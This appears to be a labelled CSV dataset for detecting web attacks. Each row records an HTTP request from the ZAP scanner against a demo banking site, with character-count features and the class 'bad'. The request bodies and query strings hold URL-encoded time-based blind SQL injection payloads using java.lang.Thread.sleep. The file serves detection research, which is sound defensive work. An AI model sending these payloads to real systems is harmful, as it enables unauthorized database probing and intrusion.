method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/sendFeedback,cfile=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,263,4,bad
GET,/Documents/JohnSmith/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,190,0,4,bad
POST,/doLogin,uid=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&passw=ZAP&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,181,5,bad
GET,/disclaimer.htm?url=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,170,0,4,bad
GET,/default.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,171,0,4,bad
POST,/doSubscribe,txtEmail=%22java.lang.Thread.sleep%22%2815000%29&btnSubmit=Subscribe,0,2,0,1,0,0,0,0,0,12,60,1,bad
POST,/sendFeedback,cfile=%22java.lang.Thread.sleep%22%2815000%29&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,7,0,0,0,0,13,143,1,bad
GET,/Privacypolicy.jsp?sec=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&template=US,,4,3,1,1,14,0,1,0,0,186,0,4,bad
GET,/Documents/JohnSmith/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,190,0,4,bad
POST,/doLogin,uid=%22java.lang.Thread.sleep%22%2815000%29&passw=ZAP&btnSubmit=Login,0,2,0,1,0,0,0,0,0,8,61,2,bad
GET,/disclaimer.htm?url=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,171,0,4,bad
GET,/images/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,176,0,4,bad
GET,/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,1,14,0,1,0,0,211,0,4,bad
GET,/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,bad
POST,/doSubscribe,txtEmail=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&btnSubmit=Subscribe,0,2,0,1,3,0,0,0,0,12,67,1,bad
POST,/sendFeedback,cfile=comments.txt+%2F+%22java.lang.Thread.sleep%22%2815000%29+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,10,0,0,0,0,13,159,1,bad
GET,/Documents/JohnSmith/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,bad
POST,/doLogin,uid=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&passw=ZAP&btnSubmit=Login,0,2,0,1,3,0,0,0,0,8,68,2,bad
GET,/Privacypolicy.jsp?sec=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&template=US,,4,2,1,1,14,0,1,0,0,186,0,4,bad
GET,/disclaimer.htm?url=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,171,0,4,bad
GET,/images/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,177,0,4,bad
GET,/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,5,2,1,1,14,0,1,0,0,212,0,4,bad
GET,/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,170,0,4,bad
POST,/sendFeedback,cfile=comments.txt%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,11,0,0,0,0,13,163,1,bad
POST,/doSubscribe,txtEmail=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Subscribe,2,2,0,1,4,0,0,0,0,12,71,1,bad
GET,/Documents/JohnSmith/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,70,0,1,bad
POST,/doLogin,uid=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&passw=ZAP&btnSubmit=Login,2,2,0,1,4,0,0,0,0,8,72,2,bad
GET,/Privacypolicy.jsp?sec=%22java.lang.Thread.sleep%22%2815000%29&template=US,,0,2,0,1,0,0,0,0,0,66,0,1,bad
GET,/disclaimer.htm?url=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,171,0,4,bad
GET,/images/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,bad
GET,/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,4,3,1,1,14,0,1,0,0,212,0,4,bad
GET,/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,170,0,4,bad
POST,/sendFeedback,cfile=comments.txt%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,1,11,0,0,0,0,13,163,1,bad
POST,/doSubscribe,txtEmail=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Subscribe,0,4,0,1,4,0,0,0,0,12,71,1,bad
POST,/doLogin,uid=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&passw=ZAP&btnSubmit=Login,0,4,0,1,4,0,0,0,0,8,72,2,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,86,0,1,bad
GET,/disclaimer.htm?url=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,51,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers+%2F+%22java.lang.Thread.sleep%22%2815000%29+&template=US,,0,2,0,1,3,0,0,0,0,77,0,1,bad
GET,/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,1,14,0,1,0,0,212,0,4,bad
GET,/images/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,177,0,4,bad
POST,/sendFeedback,cfile=comments.txt+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,2,24,0,0,0,0,13,287,4,bad
GET,/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,170,0,4,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,17,0,1,0,0,212,0,4,bad
POST,/doSubscribe,txtEmail=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Subscribe,4,2,1,2,17,0,0,0,0,12,195,4,bad
POST,/doLogin,uid=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&passw=ZAP&btnSubmit=Login,4,2,1,2,17,0,0,0,0,8,196,5,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,90,0,1,bad
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,78,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&template=US,,2,2,0,1,4,0,0,0,0,81,0,1,bad
GET,/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29&job=MortgageLendingAccountExecutive%3ASales,,0,2,0,1,0,0,0,0,0,92,0,1,bad
GET,/images/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,57,0,1,bad
POST,/sendFeedback,cfile=comments.txt%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,2,24,0,0,0,0,13,288,4,bad
GET,/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,50,0,1,bad
POST,/doSubscribe,txtEmail=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Subscribe,5,2,1,2,17,0,0,0,0,12,196,4,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,17,0,1,0,0,213,0,4,bad
GET,/search.jsp?query=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,168,0,4,bad
POST,/doLogin,uid=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&passw=ZAP&btnSubmit=Login,5,2,1,2,17,0,0,0,0,8,197,5,bad
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,82,0,1,bad
GET,/index.jsp?content=inside_jobs.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+&job=MortgageLendingAccountExecutive%3ASales,,0,2,0,1,3,0,0,0,0,111,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&template=US,,0,4,0,1,4,0,0,0,0,81,0,1,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,90,0,1,bad
GET,/images/index.jsp?content=personal.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,73,0,1,bad
GET,/index.jsp?content=inside_volunteering.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,77,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,12,173,4,bad
POST,/sendFeedback,cfile=comments.txt&name=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,271,4,bad
GET,/search.jsp?query=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,169,0,4,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,17,0,1,0,0,213,0,4,bad
POST,/doLogin,uid=ZAP&passw=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,180,5,bad
GET,/static/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,176,0,4,bad
GET,/index.jsp?content=inside_jobs.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&job=MortgageLendingAccountExecutive%3ASales,,2,2,0,1,4,0,0,0,0,115,0,1,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,214,0,4,bad
GET,/Privacypolicy.jsp?sec=Careers+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US,,4,2,1,2,17,0,0,0,0,205,0,4,bad
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,82,0,1,bad
GET,/images/index.jsp?content=personal.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,77,0,1,bad
GET,/index.jsp?content=inside_volunteering.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,81,0,1,bad
GET,/survey_questions.jsp?step=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,177,0,4,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,5,2,1,1,14,0,1,0,0,12,174,4,bad
GET,/search.jsp?query=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,169,0,4,bad
POST,/sendFeedback,cfile=comments.txt&name=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,1,21,0,1,0,0,13,272,4,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,17,0,1,0,0,213,0,4,bad
POST,/doLogin,uid=ZAP&passw=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,5,2,1,1,14,0,1,0,0,8,181,5,bad
GET,/static/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,177,0,4,bad
GET,/index.jsp?content=inside_jobs.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&job=MortgageLendingAccountExecutive%3ASales,,0,4,0,1,4,0,0,0,0,115,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US,,5,2,1,2,17,0,0,0,0,206,0,4,bad
GET,/images/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,77,0,1,bad
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,206,0,4,bad
GET,/index.jsp?content=inside_volunteering.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,215,0,4,bad
GET,/survey_questions.jsp?step=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,178,0,4,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,12,174,4,bad
POST,/sendFeedback,cfile=comments.txt&name=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,bad
POST,/doLogin,uid=ZAP&passw=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,3,1,1,14,0,1,0,0,8,181,5,bad
GET,/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,3,0,0,0,0,93,0,1,bad
GET,/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,bad
